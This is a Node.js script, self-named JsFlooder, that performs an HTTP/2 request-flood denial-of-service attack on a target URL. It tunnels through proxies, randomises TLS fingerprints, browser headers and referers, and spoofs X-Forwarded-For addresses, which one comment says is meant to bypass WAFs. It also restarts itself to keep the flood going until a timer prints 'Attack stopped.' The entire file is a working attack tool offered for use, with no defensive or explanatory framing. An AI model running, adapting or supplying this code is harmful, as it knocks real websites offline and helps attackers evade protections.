const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
 randReferer = require('random-referer')
 const rand = randReferer.getRandom()
const ua = require('user-agents');
const crypto = require('crypto');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
	let colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
/*cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]*/
cplist = [
		'GREASE:TLS_AES_128_GCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'ECDHE-ECDSA-AES128-GCM-SHA256',
		'ECDHE-RSA-AES128-GCM-SHA256',
		'ECDHE-ECDSA-AES256-GCM-SHA384',
		'ECDHE-RSA-AES256-GCM-SHA384',
		'ECDHE-ECDSA-CHACHA20-POLY1305',
		'ECDHE-RSA-CHACHA20-POLY1305',
		'ECDHE-RSA-AES128-SHA',
		'ECDHE-RSA-AES256-SHA',
		'AES128-GCM-SHA256',
		'AES256-GCM-SHA384',
		'AES128-SHA',
		'AES256-SHA',
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256'
		, ]

		const sigalgs = [
			"ecdsa_secp256r1_sha256",
			"rsa_pss_rsae_sha256",
			"rsa_pkcs1_sha256",
			"ecdsa_secp384r1_sha384",
			"rsa_pss_rsae_sha384",
			"rsa_pkcs1_sha384",
			"rsa_pss_rsae_sha512",
			"rsa_pkcs1_sha512",
		  ];
		  let concu = sigalgs.join(':');
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	} ,
	sigalgs() {
		return sigalgs[Math.floor(Math.random() * sigalgs.length)];
	  }
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
let proxyFile = process.argv[5];
const rps = process.argv[6];
let parsed = url.parse(target);

let input = 'flood';
let query = 'query';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
console.log("JsFlooder with JsBrowser - t.me/bixd08")
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
proxyr = proxyFile
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
          const searchEngines = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://search.yahoo.com',
    'https://www.duckduckgo.com',
    'https://www.baidu.com',
    'https://www.yandex.com',
    'https://www.ecosia.org',
    'https://www.qwant.com',
    'https://www.startpage.com',
    'https://www.ask.com'
];

// Ch?n ng?u nhi�n 1 domain
const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
const argsa = process.argv.slice(2);
const queryIndexa = argsa.indexOf('--post');
post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
const argsb = process.argv.slice(2);
const queryIndexg = argsb.indexOf('--query');
query = queryIndexg !== -1 ? argsb[queryIndexg + 1] : null;
const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--debug');
debug = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const argstco = process.argv.slice(2);

cookie = process.argv[7]
useragent = process.argv[8]

let method, path;
if (parsed.path.includes('%rand%')) {
    pathl = parsed.path.replace("/%rand%", generateRandomString(5, 7))
    if (query === 'true') {
        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
    } else if (query === "query") {
        path = pathl + "?s=" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
} else {
    pathl = parsed.path
    if (query === 'true') {
        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
    } else if (query === "query") {
        path = pathl + "?s=" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
}

if (post === 'true') {
    method = {
        ":method": "POST",
        "content-length": "0"
    };
} else if (post === 'random') {
    method = {
        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)],
    }
} else {
    method = {
        ":method": "GET",
    }
}
const validkey = generateRandomString(5, 10);

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Hàm logic để phân tích User-Agent và tạo các header liên quan (Client Hints)
function parseUserAgent(uaString) {
    // Regex để extract browser, version, OS, và mobile flag
    const browserRegex = /(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/;
    const osRegex = /\(([^;]+);(?:\s?([^;]+);?)?(?:\s?([^)]+))?\)/;
    const mobileRegex = /Mobile/;

    // Extract browser và version
    const browserMatch = uaString.match(browserRegex);
    const browser = browserMatch ? browserMatch[1] : 'Unknown';
    const fullVersion = browserMatch ? browserMatch[2] : '0'; // Lấy full version
    const majorVersion = fullVersion.split('.')[0]; // Major version

    // Extract OS/platform
    const osMatch = uaString.match(osRegex);
    let platform = 'Unknown';
    let platformVersion = '';
    if (osMatch) {
        if (osMatch[1].includes('Windows')) {
            platform = 'Windows';
        } else if (osMatch[1].includes('Macintosh')) {
            platform = 'macOS';
        } else if (osMatch[1].includes('Linux') && osMatch[2] && osMatch[2].includes('Android')) {
            platform = 'Android';
            platformVersion = osMatch[3] || ''; // Android version nếu có
        } else if (osMatch[1].includes('Linux')) {
            platform = 'Linux';
        } else if (osMatch[1].includes('iPhone') || osMatch[1].includes('iPad')) {
            platform = 'iOS';
        }
    }

    // Check nếu là mobile
    const isMobile = mobileRegex.test(uaString) ? '?1' : '?0';

    // Construct sec-ch-ua (dựa trên Chrome format, có thể điều chỉnh cho browser khác)
    let secChUa = '';
    if (browser === 'Chrome') {
        secChUa = `"Chromium";v="${majorVersion}", "Not)A;Brand";v="24", "Google Chrome";v="${majorVersion}"`; // "24" là ví dụ cho Not)A;Brand
    } else {
        // Có thể thêm logic cho browser khác, ví dụ Firefox: `"Gecko";v="${majorVersion}"`
        secChUa = `"${browser}";v="${majorVersion}"`;
    }

    // sec-ch-ua-full-version-list
    const secChUaFullVersionList = `"Chromium";v="${fullVersion}", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="${fullVersion}"`;

    // sec-ch-ua-platform (trong ngoặc kép)
    const secChUaPlatform = `"${platform}"`;

    // sec-ch-ua-mobile
    const secChUaMobile = isMobile;

    // sec-ch-ua-platform-version nếu có (cho Android/iOS)
    const secChUaPlatformVersion = platformVersion ? `"${platformVersion}"` : '';

    // Return object với các headers
    return {
        'sec-ch-ua': secChUa,
        'sec-ch-ua-platform': secChUaPlatform,
        'sec-ch-ua-mobile': secChUaMobile,
        'sec-ch-ua-platform-version': secChUaPlatformVersion, // Optional, chỉ nếu có version
        'sec-ch-ua-full-version-list': secChUaFullVersionList
    };
}

// Danh sách ngôn ngữ accept-language phổ biến
const acceptLanguages = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'de-DE,de;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9',
    'it-IT,it;q=0.9',
    'pt-BR,pt;q=0.9',
    'zh-CN,zh;q=0.9',
    'ja-JP,ja;q=0.9',
    'ko-KR,ko;q=0.9'
];

// Danh sách accept-encoding phổ biến
const acceptEncodings = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate'
];

// Danh sách accept headers cho document
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

function flood(proxy) {
	let parsed = url.parse(target);
	let sigals = headerFunc.sigalgs();

  let interval
if (input === 'flood') {
	interval = 1000;
  } else if (input === 'bypass') {
	function randomDelay(min, max) {
	  return Math.floor(Math.random() * (max - min + 1)) + min;
	}

	interval = randomDelay(100, 1000);
  } else {
	interval = 1000;
  }
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function getRandomFileExtension() {
    const extensions = ['.php', '.js', '.css', '.html', '.json', '.xml'];
    return extensions[Math.floor(Math.random() * extensions.length)];
}

 const nodeii = getRandomInt(134, 135);

 // Phân tích useragent để lấy các headers động
 const uaHeaders = parseUserAgent(useragent);

    const header = {
        ...method,
        ":authority": parsed.host,
        ":scheme": 'https',
        "Referer" : randomEngine,
        ":path" : path,
        //":path": path + "/" + generateRandomString(10,15) + ".php?s=" + generateRandomString(10,15) + "&" + generateRandomString(10,15),
       // ":path": path + "/" + generateRandomString(10,15) + getRandomFileExtension() + "?s=" + generateRandomString(10,15) + "&" + generateRandomString(10,15),
        "upgrade-insecure-requests": "1",
        'user-agent': useragent,
    };
    let dynHeaders = {
    "upgrade-insecure-requests": "1",
  "sec-fetch-mode": "navigate",
  "sec-fetch-dest": "document",
  "Authorization": cookie,
  "cookie": cookie,
  "sec-ch-ua": uaHeaders['sec-ch-ua'],
  "sec-ch-ua-platform": uaHeaders['sec-ch-ua-platform'],
  "sec-ch-ua-mobile": uaHeaders['sec-ch-ua-mobile'],
  ...(uaHeaders['sec-ch-ua-platform-version'] ? { 'sec-ch-ua-platform-version': uaHeaders['sec-ch-ua-platform-version'] } : {}),
  "sec-ch-ua-full-version-list": uaHeaders['sec-ch-ua-full-version-list'],
  "sec-fetch-user": "?1",
  "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
  ...(Math.random() < 0.8 ? { "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)] } : {}),
  "accept": acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
  "upgrade-insecure-requests": "1",
  "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
      ...(Math.random() < 0.3 ? { "x-forwarded-for": randomIp() } : {}), // Thêm X-Forwarded-For random để bypass một số WAF
    "cache-control": controle_header[Math.floor(Math.random() * controle_header.length)],
  "pragma": "no-cache",

}

    if (Math.random() >= 0.5) {
        dynHeaders = {
            ...dynHeaders,
   ...(Math.random() < 0.5 ?{["origin"]: parsed.origin} : {}), // Thêm Origin nếu là POST để mimic browser
          ...(Math.random() < 0.3  ?{"x-client-data": generateRandomString(20, 30)}:{}), // Header Chrome-specific
          ...(Math.random() < 0.4  ?{['sec-ch-prefers-color-scheme']: Math.random() < 0.5 ? 'light' : 'dark'} : {}),
          ...(Math.random() < 0.2  ?{['sec-ch-viewport-width']: getRandomInt(360, 1080).toString()} : {}),

        };
    }
let dynHeadersd = {
    "upgrade-insecure-requests": "1",
  "sec-fetch-mode": "navigate",
  "sec-fetch-dest": "document",
  "Authorization": cookie,
  "cookie": cookie,
  "sec-ch-ua": uaHeaders['sec-ch-ua'],
  "sec-ch-ua-platform": uaHeaders['sec-ch-ua-platform'],
  "sec-ch-ua-mobile": uaHeaders['sec-ch-ua-mobile'],
  ...(uaHeaders['sec-ch-ua-platform-version'] ? { 'sec-ch-ua-platform-version': uaHeaders['sec-ch-ua-platform-version'] } : {}),
  "sec-ch-ua-full-version-list": uaHeaders['sec-ch-ua-full-version-list'],
  "sec-fetch-user": "?1",
  "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
   "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
  ...(Math.random() < 0.3 ? {'Clear-Site-Data': "cache"}:{}),
"priority": "u=0, i",
"Refresh": "36600, url="+ parsed.href,
'Set-Login': Math.random < 0.5 ? "logged-in" : "logged-out",
...(Math.random < 0.5 ? {"Origin-Agent-Cluster": '?1'}:{}),
"cache-control": controle_header[Math.floor(Math.random() * controle_header.length)],
"pragma": "no-cache",
  ...(Math.random() < 0.8 ? { "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)] } : {}),
  "accept": acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
}

    if (Math.random() >= 0.5) {
        dynHeadersd = {
            ...dynHeadersd,
            ...(Math.random() < 0.3 ? { "x-forwarded-for": randomIp() } : {}),
   ...(Math.random() < 0.4 ?{"sec-ch-prefers-reduced-motion": "no-preference"}:{}),
          ...(Math.random() < 0.3 ?{ "sec-ch-ua-arch": "\"arm\"" }:{}),
         ...(Math.random() < 0.2 ?{ "sec-ch-ua-bitness": "\"64\"" }:{}),
          ...(Math.random() < 0.4 ?{["x-client-data"]: generateRandomString(20, 30)}:{}),

        };

    }

    let head 
    
    if (Math.random() >= 0.5) {
    head ={
        ...header,
					...dynHeaders,
         }
         }else {head ={
        ...header,
					...dynHeadersd,
         }
         }
         const sendRequest = async (client, retries = 3) => {
            try {
                const request = client.request(head, {
                    endStream: false,
                    weight: 256,
                    depends_on: 0,
                    exclusive: false,
                });

                if (debug === 'true') {
                    request.on('response', (res) => {
                        console.log(res[':status']);
                    });
                }

                request.end();
                
                // ??i cho ??n khi request ho��n t?t
                await new Promise((resolve, reject) => {
                    request.on('end', resolve);
                    request.on('error', reject);
                });

            } catch (error) {
                console.error('Request failed:', error);

                if (retries > 0) {
                    console.log('Retrying request...');
                    await sendRequest(client,retries - 1);
                } else {
                    console.error('Max retries reached. Request failed.');
                }
            }
        };
         //
         //console.log(head)
	 const regexPattern =  /^([\w.-]+):(\w+)@([\w.-]+):(\d+)$/;
 const match = proxy.match(regexPattern);
if (match) {
	const agent = new http.Agent({
		host: match[3]
		, port: match[4]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
      ,'Proxy-Authorization': 'Basic ' + Buffer.from(`${match[1]}:${match[2]}`).toString('base64')
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
 } else {
	proxy = process.argv[5].split(":");
 const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
 }
 const TLSOPTION = {
    ciphers: cplist.join(':'),
    secureProtocol: ["TLSv1_3_method"],
    sigalgs: Math.random() < 0.5 ? sigals : concu,
    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom| crypto.constants.SSLcom,
    echdCurve: Math.random() < 0.5 ? "X25519:secp256r1:secp512r1:secp384r1" : "X25519",
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: Math.random() < 0.5 ?['h2']:['h2','http1/1'],
  };

	function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		//console.log('succes connect ')
		tlsSocket.setKeepAlive(true, 600000 * 1000);
		  
		return tlsSocket;
	}
	connection.on('connect', async function(res, socket) {
		
    socket.setKeepAlive(true, 100000);
		const tlsSocket = createCustomTLSSocket(parsed, socket)	

const client = http2.connect(parsed.href, {
	createConnection: () => tlsSocket,
      settings: {
       
		headerTableSize: 65536,
		enablePush: true,
		initialWindowSize:6291456,
		...(Math.random() >= 0.5 ? {maxHeaderListSize: 262144}:{}),
		...(Math.random() >= 0.5 ? {maxFrameSize: 16777215}:{}),
		enableConnectProtocol: true
      },
	}, (session) => {
    session.setLocalWindowSize(15663105 + 65535);
});

		client.on("connect", () => {
    clearr = setInterval(async () => {
        for (let i = 0; i < rps; i++) {
            sendRequest(client); 
        }
    }, interval);
});

		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
		});

client.on("error", error => {
    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});

	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
let intervalId;
let  intervalId2;
const valid = () => setInterval(function() {
    flood(proxyr);
}, 10);

intervalId = valid();
 intervalId2 = valid();
setInterval(() => {
    clearInterval(intervalId);
    clearInterval(intervalId2);
    intervalId = valid();
    intervalId2 = valid();
}, 10000);
const {
    spawn
} = require('child_process');
const { ref } = require('process');

const MAX_RAM_PERCENTAGE = 40;

function Seconds() {
    const currentTime = Date.now();
    const elapsedTimeInSeconds = Math.floor((currentTime - startTime) / 1000);
    const remainingSeconds = Math.max(time - elapsedTimeInSeconds, 0);
    return remainingSeconds;
}

const startTime = Date.now();

const restartScript = (timereset) => {
    //console.log('[>] Restarting...');
    process.argv[3] = timereset
    //console.log(timereset)
    const child = spawn(process.argv[0], process.argv.slice(1), {
        detached: true,
        stdio: 'ignore'
    });
    child.unref();
    process.exit();
};

const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    const endtime = Seconds()
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        // console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
        restartScript(endtime);
    }
};

const Script = () => {
    const child = spawn('pkill', ['-f', validkey]);
    child.on('close', (code, signal) => {
        console.log(`Child process terminated with code ${code} and signal ${signal}`);
        process.exit();
    });
};

process.on('SIGINT', () => {
    console.log('Received SIGINT. Exiting...');
    Script();
    process.exit(0);
});

setInterval(handleRAMUsage, 1000);
console.log(`JsFlooder Started with proxies: ${proxyFile}`);

setTimeout(function() {
    console.log("Attack stopped.");
    Script();
    process.exit(1);
}, time * 1000);
